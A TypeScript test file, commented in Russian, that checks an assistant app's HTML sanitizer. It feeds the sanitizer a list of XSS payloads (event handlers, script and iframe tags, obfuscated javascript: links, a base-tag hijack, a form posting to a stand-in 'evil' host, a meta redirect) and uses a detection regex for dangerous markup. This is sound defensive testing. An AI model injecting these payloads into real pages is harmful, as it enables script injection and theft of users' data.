/**
 * Безопасность разметки в ответах Kira.
 *
 * Текст ответа складывается из веб-страниц, распознанного с экрана, файлов и
 * ответов чужих расширений — из мест, которые Kira не контролирует. А в окне
 * живёт мост к управлению компьютером. Поэтому проверяем не «красиво ли
 * выглядит», а что именно НЕ доходит до разметки.
 *
 * Прежняя чистка была набором регулярок и пропускала пять случаев из шести.
 */
import { JSDOM } from 'jsdom'
const dom = new JSDOM('')
;(globalThis as unknown as { DOMParser: unknown }).DOMParser = dom.window.DOMParser

import { sanitizeHtml } from '../src/renderer/src/lib/sanitizeHtml'

let pass = 0, fail = 0
const t = (n: string, ok: boolean, extra = ''): void => {
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${n}${extra ? '  ' + extra : ''}`); ok ? pass++ : fail++
}

/** Опасно ли то, что осталось. */
const dangerous = (html: string): boolean =>
  /\son\w+\s*=|<script|<style|<object|<embed|<iframe|<svg|<link|<meta|<form|javascript:|<base/i.test(html)

const attacks: Array<[string, string]> = [
  ['неквотированный обработчик', '<img src=x onerror=alert(1)>'],
  ['svg с onload', '<svg onload=alert(1)></svg>'],
  ['script с пробелом в теге', '<script >alert(1)</script >'],
  ['вложенный script', '<div><script>alert(1)</script></div>'],
  ['object', '<object data="evil"></object>'],
  ['embed', '<embed src="evil">'],
  ['style с внешним ресурсом', '<style>*{background:url(http://evil)}</style>'],
  ['iframe', '<iframe src="http://evil"></iframe>'],
  ['ссылка на javascript:', '<a href="javascript:alert(1)">клик</a>'],
  ['javascript: с табом внутри схемы', '<a href="java\tscript:alert(1)">клик</a>'],
  ['javascript: в верхнем регистре', '<a href="JaVaScRiPt:alert(1)">клик</a>'],
  ['картинка со скриптовой схемой', '<img src="javascript:alert(1)">'],
  ['подмена базового адреса', '<base href="http://evil/">'],
  ['форма наружу', '<form action="http://evil"><input name="p"></form>'],
  ['обработчик в одинарных кавычках', "<div onclick='alert(1)'>текст</div>"],
  ['обработчик через перенос строки', '<img src=x\nonerror=alert(1)>'],
  ['meta-редирект', '<meta http-equiv="refresh" content="0;url=http://evil">'],
  ['ссылка на файл', '<a href="file:///C:/Windows/System32/cmd.exe">открыть</a>'],
  ['чужой протокол', '<a href="ms-settings:privacy">настройки</a>']
]
for (const [name, payload] of attacks) {
  const out = sanitizeHtml(payload)
  t(`не пропущено: ${name}`, !dangerous(out), '-> ' + JSON.stringify(out.slice(0, 70)))
}

// Обычная разметка обязана выжить: чистка, съедающая ответ, не лучше дыры.
const keeps: Array<[string, RegExp]> = [
  ['жирный и курсив', /<strong>|<em>/],
  ['ссылка', /<a href="https:\/\/example\.com"/],
  ['код', /<code>/],
  ['таблица', /<table>[\s\S]*<td>/],
  ['список', /<li>/]
]
const normal = sanitizeHtml(
  '<p><strong>жирный</strong> и <em>курсив</em></p>' +
  '<p><a href="https://example.com" title="т">ссылка</a></p>' +
  '<pre><code>кода кусок</code></pre>' +
  '<table><thead><tr><th>а</th></tr></thead><tbody><tr><td>б</td></tr></tbody></table>' +
  '<ul><li>пункт</li></ul>')
for (const [name, re] of keeps) t(`сохранено: ${name}`, re.test(normal), re.test(normal) ? '' : '-> ' + normal.slice(0, 120))
// Поля ввода в ответе ассистента — это не разметка, а приманка: нарисованное
// посреди переписки «введите пароль» выглядит настолько убедительно, насколько
// человек доверяет Kira. Выбрасываем вместе с содержимым.
for (const [name, payload] of [
  ['поле ввода', '<input type="password" placeholder="Введите пароль">'],
  ['кнопка', '<button>Подтвердить оплату</button>'],
  ['выпадающий список', '<select><option>да</option></select>'],
  ['многострочное поле', '<textarea>секрет</textarea>']
] as Array<[string, string]>) {
  const out = sanitizeHtml(payload)
  t(`не пропущено: ${name}`, out.trim() === '', '-> ' + JSON.stringify(out))
}

t('текст внутри незнакомого тега не теряется',
  sanitizeHtml('<marquee>важное</marquee>').includes('важное'))
t('картинка data: остаётся — Kira показывает свои превью',
  sanitizeHtml('<img src="data:image/png;base64,iVBOR">').includes('data:image/png'))

console.log(`\n=== ИТОГО: ${pass} PASS, ${fail} FAIL ===`)
process.exit(fail ? 1 : 0)
